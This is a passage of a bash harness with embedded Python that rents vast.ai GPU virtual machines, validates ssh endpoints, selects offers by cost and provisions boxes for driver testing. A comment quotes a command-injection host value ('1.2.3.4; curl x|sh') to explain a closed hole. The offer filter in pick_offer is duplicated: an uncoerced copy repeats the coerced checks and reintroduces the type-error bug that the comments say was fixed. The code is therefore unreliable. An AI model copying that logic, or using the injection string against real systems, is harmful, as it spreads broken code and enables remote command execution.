#      are worth nothing.  The LISTING is the only evidence.
destroy_verified() {
    local id="$1"
    if is_protected "$id"; then
        warn "REFUSING to destroy protected instance $id"; return 1
    fi
    for _ in 1 2 3 4 5; do
        yes | timeout 120 vastai destroy instance "$id" -y >/dev/null 2>&1
        sleep "$DESTROY_SETTLE"
        if ! live_instance_ids | grep -qx "$id"; then
            info "destroyed $id (verified absent from the listing)"
            return 0
        fi
        sleep "$DESTROY_BACKOFF"
    done
    warn "COULD NOT DESTROY $id after 5 attempts"
    LEAK_SUSPECTED=1
    return 1
}

# Backstop for what the normal path cannot cover: a create whose id we failed to
# parse, or a create that timed out after the API had already committed.  Only
# ever touches instances carrying OUR label.
reap_strays() {
    local ids id gpu

    # AN EMPTY LABEL IS NOT "MATCH EVERYTHING". It means we do not yet know what
    # is ours, and the only safe action is none.
    #
    # `trap cleanup EXIT` is installed ~1700 lines before SWEEP_LABEL is derived
    # from the run directory, so ANY early exit -- a die(), a `set -u` trip, a
    # Ctrl-C, arm_autodestroy() refusing to proceed -- reaches cleanup() ->
    # reap_strays() with SWEEP_LABEL still "". The matcher below does
    # `lab = i.get("label") or ""`, so "" == "" would then match every
    # UNLABELLED instance on the account and destroy it: other people's boxes,
    # other projects' boxes, anything rented by hand.
    #
    # Found 2026-08-29 while reviewing a test failure that looked like a stale
    # fixture. The test only ever exercised the library path, where SWEEP_LABEL
    # is likewise unset -- so the inversion it reported ("the unlabelled box was
    # destroyed") was the real behaviour, correctly observed, and dismissed as a
    # test artifact. It was not.
    if [ -z "${SWEEP_LABEL:-}" ]; then
        warn "reap_strays: no sweep label set -- REFUSING to reap."
        warn "  An empty label matches every unlabelled instance on the account."
        return 0
    fi
    ids="$(vj show instances | python3 -c '
import json,sys
try: d = json.load(sys.stdin)
except Exception: sys.exit(0)
if isinstance(d, dict): d = d.get("instances", []) or []
for i in d:
    lab = i.get("label") or ""
    if (lab.startswith(sys.argv[1]) if len(sys.argv) > 2 and sys.argv[2] == "prefix"
        else lab == sys.argv[1]):
        print(i.get("id"), i.get("gpu_name"))
' "$SWEEP_LABEL" "${RECONCILE_PREFIX:+prefix}" 2>/dev/null)"
    [ -z "$ids" ] && return 0
    while read -r id gpu; do
        [ -z "$id" ] && continue
        # A box kept for inspection is not a stray.  PROTECTED covers this
        # process; the file covers a --resume, where the keep was decided by an
        # earlier invocation that is no longer running.
        if is_protected "$id" || { [ -n "${KEPT_FILE:-}" ] && [ -f "$KEPT_FILE" ] && grep -qx "$id" "$KEPT_FILE" 2>/dev/null; }; then
            info "keeping $id ($gpu) for inspection -- not a stray"
            continue
        fi
        warn "STRAY $id ($gpu) still alive -- destroying"
        destroy_verified "$id" || warn "STRAY $id COULD NOT BE DESTROYED -- DESTROY IT BY HAND"
    done <<<"$ids"
}

# Final reconciliation.  Never trust the bookkeeping: ask vast.ai what is
# actually running and shout about anything of ours that survived.
reconcile() {
    local id live leaked=""
    live="$(live_instance_ids)"
    if [ -f "$REGISTRY" ]; then
        while read -r id; do
            [ -z "$id" ] && continue
            if printf '%s\n' "$live" | grep -qx "$id"; then leaked="$leaked $id"; fi
        done < <(grep -oE '^[0-9]+' "$REGISTRY" 2>/dev/null | sort -u)
    fi
    # A deliberate keep is not a leak, whether it came from --keep or from the
    # keep-on-error policy.  Calling it one makes the exit code that means "go
    # destroy something by hand" fire on ordinary runs, which is how a real leak
    # later gets ignored.
    if [ -n "$leaked" ] && [ "$KEEP" != 1 ] && [ -n "${KEPT_FILE:-}" ] && [ -s "$KEPT_FILE" ]; then
        local still=""
        for id in $leaked; do
            grep -qx "$id" "$KEPT_FILE" 2>/dev/null || still="$still $id"
        done
        if [ -z "$still" ]; then
            info "kept alive on purpose (failures to inspect):$leaked"
            info "  the auto-destroy timer (pid ${TIMER_PID:-?}) still holds them; destroy early with:"
            for id in $leaked; do info "    yes | vastai destroy instance $id -y"; done
            return 0
        fi
        leaked="$still"
    fi
    if [ -n "$leaked" ] && [ "$KEEP" = 1 ]; then
        # --keep means "leave it up on purpose".  Calling that a leak and
        # exiting 4 would make the exit code that means "go destroy something
        # by hand" fire on every deliberate run, which is how a real leak later
        # gets ignored.
        info "kept alive on purpose (--keep):$leaked"
        info "  the auto-destroy timer (pid ${TIMER_PID:-?}) still holds them; destroy with:"
        for id in $leaked; do info "    yes | vastai destroy instance $id -y"; done
        return 0
    fi
    if [ -n "$leaked" ]; then
        LEAK_SUSPECTED=1
        warn ""
        warn "############################################################"
        warn "## INSTANCES THIS SWEEP CREATED ARE STILL ALIVE AND BILLING"
        warn "##  $leaked"
        warn "## The auto-destroy timer (pid ${TIMER_PID:-?}) should take them at"
        warn "## its deadline, but DO NOT RELY ON THAT.  Destroy them now:"
        for id in $leaked; do warn "##   yes | vastai destroy instance $id -y"; done
        warn "############################################################"
        return 1
    fi
    info "reconciled: nothing this sweep created is still alive"
    return 0
}

CLEANED=0
TREE_TGZ=""
cleanup() {
    [ "$CLEANED" = 1 ] && return
    CLEANED=1
    say ""
    info "cleanup: destroying anything this sweep still owns"
    if [ "$KEEP" = 1 ]; then
        warn "--keep given: NOT destroying. The auto-destroy timer is still armed."
    else
        [ -n "${CUR_INSTANCE:-}" ] && destroy_verified "$CUR_INSTANCE"
        reap_strays
    fi
    reconcile || true
    # Tell the timer the sweep is over.  It only stands down once the LISTING
    # agrees that nothing registered is alive, so this is a hint, not a disarm.
    [ -n "$REGISTRY" ] && : >"${REGISTRY}.done"
    # Own private temporaries. Both are mktemp'd, so an unset value here means
    # they were never created rather than that a path needs guessing.
    [ -n "$ABIQ_DIR" ] && rm -rf -- "$ABIQ_DIR"
    [ -n "$TREE_TGZ" ] && rm -f -- "$TREE_TGZ"
    return 0
}
trap cleanup EXIT
trap 'warn "interrupted"; exit 130' INT TERM

# ---------------------------------------------------------------------------
# ssh helpers
# ---------------------------------------------------------------------------
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR"

# EVERY vast.ai API FIELD IS UNTRUSTED INPUT.
#
# `public_ipaddr`, `ssh_host` and the port come out of a marketplace API whose
# values a host operator influences.  They used to be interpolated straight into
# the ssh command string that rsh_t runs through `eval`, which made a host that
# advertised itself as `1.2.3.4; curl x|sh` arbitrary root command execution ON
# THE COORDINATOR -- the machine running the sweep, not the rented box.
#
# Two independent defences, because this one is worth two:
#   1. reject the value here, at the source, before it reaches any command; and
#   2. build an ARGV ARRAY rather than a string, so nothing re-parses it later.
# Either alone would do. Neither is allowed to be the only one.
sweep_valid_host() {   # IPv4/IPv6 literal or DNS name, nothing else
    case "$1" in
        ''|*[!0-9A-Za-z.:_-]*) return 1 ;;
        -*) return 1 ;;                    # cannot be mistaken for an ssh option
        *) return 0 ;;
    esac
}
sweep_valid_port() {
    case "$1" in
        ''|*[!0-9]*) return 1 ;;
        *) [ "$1" -ge 1 ] && [ "$1" -le 65535 ] ;;
    esac
}
SSH=""
SCP_HOST=""
SCP_PORT=""
SSH_ARGV=()
BOX_VIRT=""
BOX_KVM=""
PROVISION_FAILED_STEP=""

# Quote a remote command exactly once.  The naive  ssh host 'cmd'  idiom cannot
# express a command that itself contains single quotes, and several below do
# (apt patterns, bracketed pgrep patterns).  Without this they mangle into
# something other than what was written -- silently.
#
# THE GUARD IS NOT OPTIONAL.  This builds a command with eval, so an EMPTY $SSH
# would collapse `timeout 60 $SSH <cmd>` into `timeout 60 <cmd>` and run it
# LOCALLY -- and the commands passed through here include
# `rm -rf /root/nvkvm/host-libs-*` and `systemctl stop ...`.  A box that never
# came up must never be able to turn into a destructive local command.
rsh_t() {
    local tmo="$1"; shift
    if [ "${#SSH_ARGV[@]}" -eq 0 ]; then
        warn "rsh_t: no ssh target set -- REFUSING to run remotely-intended command locally: ${1:0:60}"
        return 97
    fi
    # `< /dev/null` IS LOAD-BEARING.  ssh reads stdin, and these run inside
    # `while IFS=... read ... done <<< "$todo"` loops -- so without it the first
    # ssh SWALLOWS THE REST OF THE DRIVER LIST and the box quietly tests one
    # driver instead of six, reporting success for a sweep that never happened.
    # That is precisely the silent-undercoverage failure this script exists to
    # prevent, so it is spelled out rather than left as a habit.
    # NO eval.  The command is passed as ONE argv element, which is exactly what
    # the old `printf %q` + eval pair reconstructed -- ssh sends it verbatim and
    # the REMOTE shell parses it, which is the intended semantics.  Removing the
    # local eval removes the only place a hostile endpoint string could become
    # local code.
    timeout "$tmo" "${SSH_ARGV[@]}" "$1" < /dev/null
}

# ---------------------------------------------------------------------------
# offer selection
#
# Advertised fields deliberately NOT used as selection criteria:
#   driver_version -- describes the PHYSICAL HOST and is meaningless for a KVM
#                     rental; every box boots the same guest image with the same
#                     preinstalled driver.  We install our own regardless.
#   inet_down      -- one box advertised 1.3 Gbps and pulled at ~10 KB/s.  It is
#                     recorded for forensics and ignored for ranking.
# ---------------------------------------------------------------------------
TRIED_MACHINES=""
pick_offer() {
    local arch="$1" offers_json rc
    # NOTE: the offer JSON goes through a TEMP FILE, not a pipe.  `cmd | python3
    # - <<'PY'` cannot work: the heredoc IS stdin, so the piped JSON is
    # discarded and the script reads its own source.  That silently reported
    # "no rentable offer" for every architecture on a market full of them.
    offers_json="$(mktemp)"
    vj search offers 'vms_enabled=true num_gpus=1 rentable=true' -o dph >"$offers_json"
    python3 - "$REPO" "$arch" "$MAX_DPH" "$GPU_FILTER" "$TRIED_MACHINES" "$KNOWN_BAD_FILE" "$offers_json" \
             "$MAX_STORAGE_PER_GB_MONTH" "$MAX_INET_DOWN_PER_TB" "$MAX_INET_UP_PER_TB" \
             "$EST_DOWN_GB_PER_BOX" "$DISK" <<'PY'
import json, sys, os, importlib.util
repo, want_arch, max_dph, gpu_filter, tried, kbfile, offers_path = sys.argv[1:8]
max_stor_gb_mo, max_down_tb, max_up_tb, est_down_gb, disk_gb = (float(x) for x in sys.argv[8:13])
spec = importlib.util.spec_from_file_location(
    "sweep_matrix", os.path.join(repo, "scripts", "sweep_matrix.py"))
m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)

bad = set()
if os.path.exists(kbfile):
    for line in open(kbfile):
        line = line.split("#")[0].strip()
        if line.isdigit():
            bad.add(line)
bad |= set(tried.split())

try:
    with open(offers_path) as fh:
        offers = json.load(fh)
except Exception:
    offers = []

cands = []
for o in offers:
    gpu = o.get("gpu_name") or ""
    if m.is_unsupported(gpu):
        continue          # pre-Turing: a documented negative, never a coverage slot
    if gpu_filter and gpu_filter.upper() not in gpu.upper():
        continue
    if want_arch and m.arch_of(gpu) != want_arch:
        continue
    if str(o.get("machine_id")) in bad:
        continue
    # COERCE THE PRICE, and skip the offer if it will not coerce.
    #
    # This was `(o.get("dph_total") or 99) > float(max_dph)`, which compares
    # whatever the API sent against a float.  A price that arrives as a JSON
    # STRING -- "0.9", which is a perfectly ordinary way for an API to encode a
    # decimal -- raises TypeError there, and the traceback aborts pick_offer for
    # EVERY offer, not just the malformed one.  One bad listing anywhere in the
    # marketplace response and the sweep finds no box at all, with an error that
    # names Python rather than the listing.
    #
    # Coercing also keeps dph_total a NUMBER by the time it is printed on the
    # tab-separated line below, which is what the shell then substitutes into
    # the cost arithmetic.  That was safe before only by accident of this
    # comparison raising first; it is now safe by construction, which is the
    # property worth having in a value that comes from a marketplace listing.
    # A missing or zero price is still treated as "assume expensive, skip",
    # which is what the old `or 99` did and is the right way round: a listing
    # that will not say what it costs is not one to rent under a spend cap.
    try:
        dph = float(o.get("dph_total"))
    except (TypeError, ValueError):
        continue
    # COERCE EVERY MARKETPLACE NUMBER, and skip the offer if one will not
    # coerce.  A price that arrives as a JSON STRING -- "0.9", an ordinary way
    # for an API to encode a decimal -- raises TypeError when compared against a
    # float, and the traceback aborts pick_offer for EVERY offer, not just the
    # malformed one: one bad listing anywhere in the marketplace response and
    # the sweep finds no box at all, with an error naming Python rather than the
    # listing.  close/packaging-pv fixed that for dph_total; the storage and
    # network filters below have exactly the same shape, so fixing only dph
    # would have left the same bug in three more places.
    #
    # A missing or zero PRICE is still "assume expensive, skip" -- a listing
    # that will not say what it costs is not one to rent under a spend cap.
    def num(key):
        v = o.get(key)
        if v is None:
            return None
        try:
            return float(v)
        except (TypeError, ValueError):
            return None

    dph = num("dph_total")
    if dph is None or not (dph > 0) or dph > float(max_dph):
        continue
    o["dph_total"] = dph
    # storage_total_cost is 0 for EVERY offer in a search that requests no
    # disk -- filtering on it silently accepted everyone. The per-unit price is
    # storage_cost ($/GB/month); scale it by the disk this run will actually
    # ask for.  Unpriced storage is treated as free, which is what it is for a
    # box that does not charge for it.
    if (num("storage_cost") or 0.0) > max_stor_gb_mo:
        continue
    # Network is NOT in dph_total. An unpriced field means unknown, and unknown
    # on a spend-capped unattended run is treated as too expensive.
    down_tb = num("internet_down_cost_per_tb")
    up_tb   = num("internet_up_cost_per_tb")
    if down_tb is None or up_tb is None:
        continue
    if down_tb > max_down_tb or up_tb > max_up_tb:
        continue
    # storage_total_cost is 0 for EVERY offer in a search that requests no
    # disk -- filtering on it silently accepted everyone. The per-unit price is
    # storage_cost ($/GB/month); scale it by the disk this run will actually
    # ask for.
    if (o.get("storage_cost") or 0) > max_stor_gb_mo:
        continue
    # Network is NOT in dph_total. An unpriced field means unknown, and unknown
    # on a spend-capped unattended run is treated as too expensive.
    down_tb = o.get("internet_down_cost_per_tb")
    up_tb   = o.get("internet_up_cost_per_tb")
    if down_tb is None or up_tb is None:
        continue
    if down_tb > max_down_tb or up_tb > max_up_tb:
        continue
    cands.append(o)

if not cands:
    sys.exit(1)

# Rank on what the box will ACTUALLY cost for this job, not on the sticker
# price: an hour of compute plus the transfer the sweep is about to do. Two
# offers an hour apart in dph can invert once ~8 GB of driver downloads is
# priced in.
def expected(o, hours=3.0):
    """What this box costs for THIS job: compute + its disk + its transfer.
    Storage dominates network at these volumes, so both are counted.
    Every field is coerced for the reason given in the filter above: a string
    price here would raise inside min()'s key and abort the whole search."""
    def f(key, default):
        v = o.get(key)
        try:
            return float(v)
        except (TypeError, ValueError):
            return default
    compute = f("dph_base", 99.0) * hours
    storage = f("storage_cost", 0.0) * disk_gb / 730.0 * hours
    network = f("internet_down_cost_per_tb", 0.0) * (est_down_gb / 1024.0)
    return compute + storage + network

o = min(cands, key=expected)
print("\t".join(str(x) for x in [
    o.get("id"), o.get("machine_id"), o.get("gpu_name"),
    o.get("dph_total"), o.get("geolocation") or "?", o.get("inet_down") or "?",
    o.get("driver_version") or "?",
    round((o.get("storage_cost") or 0) * disk_gb / 730.0, 5),
    round(o.get("internet_down_cost_per_tb") or 0, 2),
    round((o.get("internet_down_cost_per_tb") or 0) * (est_down_gb / 1024.0), 4)]))
PY
    rc=$?
    rm -f "$offers_json"
    return $rc
}

# ---------------------------------------------------------------------------
# box acquisition -- telling a SLOW box from a DEAD one
# ---------------------------------------------------------------------------
CUR_INSTANCE=""
CUR_MACHINE=""
CUR_DPH=""
CUR_HOST=""
CUR_PORT=""

# Extract the new instance id from `vastai create instance` output.
#
# MUST be tolerant: if a box is created and we lose its id, nothing can destroy
# it and it bills until a human notices.  The CLI prints
#     Started. {'success': True, 'new_contract': 123}
# which is NOT json (bare True, prose prefix), so a plain json.loads silently
# orphans every box.  Try json, then a regex, then the trailing success line.
parse_contract() {
python3 -c '
import json, re, sys
out = sys.stdin.read()
try:
    d = json.loads(out)
    if isinstance(d, dict) and d.get("new_contract"):
        print(d["new_contract"]); raise SystemExit
except SystemExit:
    raise
except Exception:
    pass
for pat in (r"new_contract[\x27\"]?\s*[:=]\s*(\d+)", r"launched successfully:\s*(\d+)"):
    mm = re.search(pat, out)
    if mm:
        print(mm.group(1)); break
'
}

instance_field() {
    vj show instance "$1" | python3 -c '
import json,sys
try: d = json.load(sys.stdin)
except Exception: sys.exit(0)
if isinstance(d, list): d = d[0] if d else {}
print(d.get(sys.argv[1], "") or "")
' "$2" 2>/dev/null
}

# The ssh endpoint that actually works.  The sshN.vast.ai proxy is frequently
# refused, so try public_ipaddr + the mapped 22/tcp HostPort FIRST and fall back
# to the proxy rather than declaring a healthy box dead.
ssh_endpoints() {
    vj show instance "$1" | python3 -c '
import json,sys
try: d = json.load(sys.stdin)
except Exception: sys.exit(0)
if isinstance(d, list): d = d[0] if d else {}
p = (d.get("ports") or {}).get("22/tcp")
if d.get("public_ipaddr") and p:
    print(d["public_ipaddr"], p[0]["HostPort"])
if d.get("ssh_host") and d.get("ssh_port"):
    print(d["ssh_host"], d["ssh_port"])
' 2>/dev/null
}

# Is this box dead in the one way that is genuinely deterministic?
#
# THE ONLY VALID SIGNATURE IS THE LOG.  Not the status string on its own, and
# NEVER elapsed time -- `loading` for half an hour is normal and healthy, and
# destroying on a stopwatch is what cost three healthy instances on 2026-08-23.
# A dead box is:  actual_status == created  AND  an instance log frozen at
# "Domain not found: no domain with matching name 'C.<id>'".  We additionally
# require the log to be byte-identical across two polls at least ~2 minutes
# apart, so a box merely mid-transition is not condemned.
DEADCHECK_HASH=""
DEADCHECK_WHEN=0
box_is_dead() {
    local id="$1" status="$2" logtxt h now
    [ "$status" = "created" ] || { DEADCHECK_HASH=""; return 1; }
    logtxt="$(timeout 120 vastai logs "$id" --tail 40 2>/dev/null)"
    printf '%s' "$logtxt" | grep -q "Domain not found: no domain with matching name" \
        || { DEADCHECK_HASH=""; return 1; }
    h="$(printf '%s' "$logtxt" | md5sum | cut -d' ' -f1)"
    now="$(date +%s)"
    if [ -n "$DEADCHECK_HASH" ] && [ "$h" = "$DEADCHECK_HASH" ] \
       && [ $(( now - DEADCHECK_WHEN )) -ge "$DEADCHECK_SETTLE" ]; then
        return 0
    fi
    [ "$h" = "$DEADCHECK_HASH" ] || { DEADCHECK_HASH="$h"; DEADCHECK_WHEN="$now"; }
    return 1
}

# Returns 0 with CUR_HOST/CUR_PORT set, 1 for "dead machine -- blacklist and
# re-rent elsewhere", 2 for "timed out or stopped".
wait_for_box() {
    local id="$1" deadline status host port out last_status="" hb=""
    deadline=$(( $(date +%s) + WAIT_BUDGET ))
    DEADCHECK_HASH=""; DEADCHECK_WHEN=0
    while [ "$(date +%s)" -lt "$deadline" ]; do
        stop_requested && return 2
        status="$(instance_field "$id" actual_status)"
        if [ "$status" != "$last_status" ]; then
            info "  instance $id: actual_status=$status"
            last_status="$status"
        elif [ "$hb" != "$(( $(date +%s) / 300 ))" ]; then
            hb="$(( $(date +%s) / 300 ))"
            # A heartbeat, not a warning.  `loading` means the image is still
            # pulling and the correct action is to keep waiting.
            info "  instance $id: still '$status' -- $(( (deadline - $(date +%s)) / 60 ))m of patience left (this is normal; VM images take ~30m)"
        fi

        if [ "$status" = "running" ]; then
            while read -r host port; do
                [ -z "$host" ] && continue
                # -n: this loop's stdin is the endpoint list; ssh must not eat it.
                out="$(timeout 45 ssh -n $SSH_OPTS -o ConnectTimeout=12 -p "$port" \
                        "root@$host" 'echo NVKVM_SSH_OK' 2>/dev/null)"
                case "$out" in
                    *NVKVM_SSH_OK*)
                        if ! sweep_valid_host "$host" || ! sweep_valid_port "$port"; then
                            warn "REFUSING endpoint from the vast API: host='$host' port='$port'"
                            warn "  These fields are attacker-influenceable and are used to build"
                            warn "  commands that run as root here. Skipping this endpoint."
                            continue
                        fi
                        CUR_HOST="$host"; CUR_PORT="$port"
                        # shellcheck disable=SC2206  # SSH_OPTS is a fixed local literal
                        SSH_ARGV=(ssh $SSH_OPTS -o ConnectTimeout=20 -p "$port" "root@$host")
                        SSH="ssh $SSH_OPTS -o ConnectTimeout=20 -p $port root@$host"
                        SCP_HOST="$host"; SCP_PORT="$port"
                        info "  ssh up: root@$host:$port"
                        return 0 ;;
                esac
            done < <(ssh_endpoints "$id")
        fi

        if box_is_dead "$id" "$status"; then
            warn "  instance $id on machine $CUR_MACHINE is DEAD: actual_status=created with"
            warn "  the instance log frozen at 'Domain not found'.  Host-side and deterministic"
            warn "  per machine -- reboot and recycle reproduce it byte-identically."
            return 1
        fi
        sleep "$POLL_INTERVAL"
    done
    return 2
}

# ---------------------------------------------------------------------------
# in-box verification: is this REALLY a VM?
#
# `grep vmx /proc/cpuinfo` IS NOT A VALID CHECK and must never be used here: a
# container inherits the host's CPU flags, returns a large count, and looks
# perfectly healthy -- while the NVIDIA module belongs to the physical host and
# every driver install is a no-op.  systemd-detect-virt is the reliable check:
# `kvm` is what we want, `docker` means we rented the wrong thing.
# ---------------------------------------------------------------------------
verify_is_vm() {
    BOX_VIRT="$(rsh_t 60 'systemd-detect-virt 2>/dev/null || echo unknown' 2>/dev/null | tr -d '\r\n ')"
    BOX_KVM="$(rsh_t 60 'test -e /dev/kvm && echo yes || echo no' 2>/dev/null | tr -d '\r\n ')"
    info "  systemd-detect-virt=$BOX_VIRT  /dev/kvm=$BOX_KVM"
    case "$BOX_VIRT" in kvm|qemu) ;; *) return 1 ;; esac
    [ "$BOX_KVM" = "yes" ]
}

# ---------------------------------------------------------------------------
# manual host: a box we did not rent
#
# Everything between "ssh works" and "destroy" is identical to the vast path --
# same provisioning, same validate.sh, same verdict vocabulary -- so a manual
# host reuses sweep_drivers_on_box() verbatim.  Only the ends differ: no create,
# no destroy, no billing.
#
# The capability check is NOT verify_is_vm().  That one demands
# systemd-detect-virt in {kvm,qemu} because on vast anything else means we
# rented a container by mistake, and a container inherits the host's CPU flags
# and makes every driver install a silent no-op.  A manual host is the opposite
# case: BARE METAL IS THE BEST INPUT we can be given, and it reports "none".
# What actually matters either way is a usable /dev/kvm, so that is what we
# require, and a container is still refused.
# ---------------------------------------------------------------------------
MANUAL_HOST_DETAIL=""
verify_host_capable() {
    BOX_VIRT="$(rsh_t 60 'systemd-detect-virt 2>/dev/null || echo unknown' 2>/dev/null | tr -d '\r\n ')"
    BOX_KVM="$(rsh_t 60 'test -w /dev/kvm && echo yes || echo no' 2>/dev/null | tr -d '\r\n ')"
    info "  systemd-detect-virt=$BOX_VIRT  /dev/kvm(writable)=$BOX_KVM"
    case "$BOX_VIRT" in
        docker|podman|lxc|lxc-libvirt|container-other|rkt|systemd-nspawn)
            MANUAL_HOST_DETAIL="systemd-detect-virt=$BOX_VIRT -- this is a container. The NVIDIA module belongs to the host, so a driver install here is a no-op and every result would be the host's, not ours."
            return 1 ;;
    esac
    if [ "$BOX_KVM" != "yes" ]; then
        MANUAL_HOST_DETAIL="/dev/kvm is not writable by this user -- the guest cannot be booted, so nothing below this point would be measuring nvkvm."
        return 1
    fi
    return 0
}

# --ssh accepts  user@host:port  |  host:port  |  host   (user defaults to root,
# port to 22).  Both fields go through the SAME validators the vast endpoints
# do: they end up inside commands that run as root here, and "the operator
# typed it" is not a reason to skip validation -- it may have been pasted from
# a provider's web UI.
set_manual_endpoint() {
    local spec="$1" user host port
    case "$spec" in
        *@*) user="${spec%%@*}"; spec="${spec#*@}" ;;
        *)   user="root" ;;
    esac
    case "$spec" in
        *:*) host="${spec%:*}"; port="${spec##*:}" ;;
        *)   host="$spec"; port="22" ;;
    esac
    sweep_valid_host "$host" || die "--ssh: refusing host '$host' (want an IPv4/IPv6 literal or a DNS name)" 3
    sweep_valid_port "$port" || die "--ssh: refusing port '$port'" 3
    case "$user" in
        ''|*[!a-zA-Z0-9._-]*) die "--ssh: refusing user '$user'" 3 ;;
    esac
    # Root, and say so rather than half-working.  provision_box() and the driver
    # staging write to /root and scp as root@; a sudo-user host would get part
    # way and fail somewhere less obvious than here.  Every provider this is
    # aimed at (vast, Spheron, LeaderGPU, Lambda) hands out root.
    [ "$user" = "root" ] || die "--ssh: this harness needs root on the target (got '$user'). The provisioning path writes to /root and copies as root@; a non-root host would fail later and less clearly than here." 3
    CUR_HOST="$host"; CUR_PORT="$port"
    # shellcheck disable=SC2206  # SSH_OPTS is a fixed local literal
    SSH_ARGV=(ssh $SSH_OPTS -o ConnectTimeout=20 -p "$port" "$user@$host")
    SSH="ssh $SSH_OPTS -o ConnectTimeout=20 -p $port $user@$host"
    SCP_HOST="$host"; SCP_PORT="$port"; SCP_USER="$user"
    info "  manual host: $user@$host:$port"
}

sweep_manual_box() {
    local arch="$1" gpu rc logdir
    set_manual_endpoint "$MANUAL_SSH"

    if ! rsh_t 60 'echo NVKVM_SSH_OK' 2>/dev/null | grep -q NVKVM_SSH_OK; then
        emit "$(jrec arch "$arch" driver "-" status "no-ssh" host "$CUR_HOST" \
                detail "could not reach the manual host over ssh" \
                cost "external host, cost not tracked" ts "$(date -u +%FT%TZ)")"
        warn "manual host unreachable over ssh"
        return 2
    fi
    if ! verify_host_capable; then
        emit "$(jrec arch "$arch" driver "-" status "host-not-capable" host "$CUR_HOST" \
                detail "$MANUAL_HOST_DETAIL" \
                cost "external host, cost not tracked" ts "$(date -u +%FT%TZ)")"
        warn "manual host is not usable: $MANUAL_HOST_DETAIL"
        return 2
    fi

    gpu="$(rsh_t 90 'nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null | head -1' 2>/dev/null | tr -d '\r' | sed 's/^ *//;s/ *$//')"
    [ -n "$gpu" ] || gpu="unknown"
    info "  gpu reports: $gpu"

    logdir="$OUT_DIR/logs/manual-$CUR_HOST"
    mkdir -p "$logdir"

    if ! provision_box; then
        emit "$(jrec arch "$arch" gpu "$gpu" driver "-" status "build-failed" host "$CUR_HOST" \
                detail "${PROVISION_FAIL_DETAIL:0:400}" \
                cost "external host, cost not tracked" ts "$(date -u +%FT%TZ)")"
        return 2
    fi
    sweep_drivers_on_box "$arch" "$gpu" "manual:$CUR_HOST" "manual" "$logdir"
    collect_logs "$logdir" 2>/dev/null || true
    info "  manual host left running and untouched -- nothing was rented, nothing destroyed"
    return 0
}

# ---------------------------------------------------------------------------
# provisioning (ONCE per box: neither QEMU nor the guest image depends on the
# host driver, so this cost is amortised across the whole driver set.  That is
# the entire economic argument for installing drivers rather than shopping for
# boxes that happen to have them.)
# ---------------------------------------------------------------------------
PROVISION_FAIL_DETAIL=""

HOST_APT_DETAIL=""
quiesce_host_apt() {
    local out rc
    HOST_APT_DETAIL=""
    out="$(rsh_t 300 '
systemctl stop apt-daily.timer apt-daily-upgrade.timer apt-daily.service apt-daily-upgrade.service unattended-upgrades.service 2>/dev/null || true
systemctl mask --runtime apt-daily.timer apt-daily-upgrade.timer apt-daily.service apt-daily-upgrade.service unattended-upgrades.service 2>/dev/null || true

# A service reaching inactive is not enough: the package worker can outlive
# the unit stop briefly.  Do not launch a second apt until every dpkg/apt lock
# is free.  Once the timers are runtime-masked there is no new contender able
# to enter between this check and the following apt invocation.
for attempt in $(seq 1 60); do
    busy=""
    if command -v fuser >/dev/null 2>&1; then
        busy="$(fuser /var/lib/dpkg/lock-frontend /var/lib/dpkg/lock /var/cache/apt/archives/lock 2>/dev/null || true)"
    else
        busy="$(pgrep -f "(^|/)(apt|apt-get|dpkg|unattended-upgr)" 2>/dev/null || true)"
    fi
    [ -z "$busy" ] && exit 0
    sleep 2
done

echo "[HARNESS] apt/dpkg locks remained busy after services and timers were stopped"
command -v fuser >/dev/null 2>&1 && \
    fuser -v /var/lib/dpkg/lock-frontend /var/lib/dpkg/lock /var/cache/apt/archives/lock 2>&1 || true
ps -eo pid,ppid,stat,comm,args | grep -E "(apt|dpkg|unattended)" | grep -v grep || true
exit 73
' 2>&1)"; rc=$?
    if [ "$rc" != 0 ]; then
        HOST_APT_DETAIL="${out: -3000}"
        [ -n "$HOST_APT_DETAIL" ] || HOST_APT_DETAIL="[HARNESS] host apt quiesce failed (rc=$rc)"
        return 1
    fi
    return 0
}

GUEST_IMAGE_CACHE_DETAIL=""

# Relay the preflight-authenticated Ubuntu image only after SSH and the QEMU
# build are known-good.  Both the image and setup_guest-compatible sidecar are
# staged under temporary names.  The reusable image path is changed only after
# the received bytes hash to the coordinator's trusted digest.
stage_cached_guest_image() {
    local src="$GUEST_IMAGE_CACHE" want="$GUEST_IMAGE_CACHE_SHA256"
    local remote="/opt/nvkvm-guest/$GUEST_IMAGE_NAME" tmp side_tmp got side actual
    GUEST_IMAGE_CACHE_DETAIL=""
    [ -n "$src" ] || return 0
    [ -n "${SCP_HOST:-}" ] && [ -n "${SCP_PORT:-}" ] || {
        GUEST_IMAGE_CACHE_DETAIL="[HARNESS] cannot relay guest image cache: no SSH endpoint"
        return 2
    }

    # Detect replacement or mutation after the initial preflight rather than
    # copying bytes under a digest that authenticated an earlier file.
    actual="$(sha256sum -- "$src" 2>/dev/null | awk '{print $1}')"
    if ! valid_sha256 "$actual" || [ "${actual,,}" != "$want" ]; then
        GUEST_IMAGE_CACHE_DETAIL="[HARNESS] guest image cache changed after preflight: $src"
        return 2
    fi

    got="$(rsh_t 300 "sha256sum '$remote' 2>/dev/null | awk '{print \$1}'" 2>/dev/null | tr -d '\r\n')"
    side="$(rsh_t 90 "cat '$remote.sha256' 2>/dev/null" 2>/dev/null | tr -d '\r\n')"
    if [ "$got" = "$want" ] && [ "$side" = "$want  $GUEST_IMAGE_URL" ]; then
        info "  guest image cache: already staged and SHA-256 matched"
        return 0
    fi

    rsh_t 120 'install -d -m 0755 /opt/nvkvm-guest' >/dev/null 2>&1 || {
        GUEST_IMAGE_CACHE_DETAIL="[HARNESS] could not create remote guest image directory"
        return 2
    }
    tmp="$remote.relay.$$.part"
    side_tmp="$remote.sha256.relay.$$.part"
    timeout 3600 scp $SSH_OPTS -P "$SCP_PORT" -q -- "$src" "root@$SCP_HOST:$tmp" || {
        rsh_t 90 "rm -f '$tmp' '$side_tmp'" >/dev/null 2>&1
        GUEST_IMAGE_CACHE_DETAIL="[HARNESS] scp failed while relaying guest image cache"
        return 2
    }
    got="$(rsh_t 600 "sha256sum '$tmp' 2>/dev/null | awk '{print \$1}'" 2>/dev/null | tr -d '\r\n')"
    if [ "$got" != "$want" ]; then
        rsh_t 90 "rm -f '$tmp' '$side_tmp'" >/dev/null 2>&1
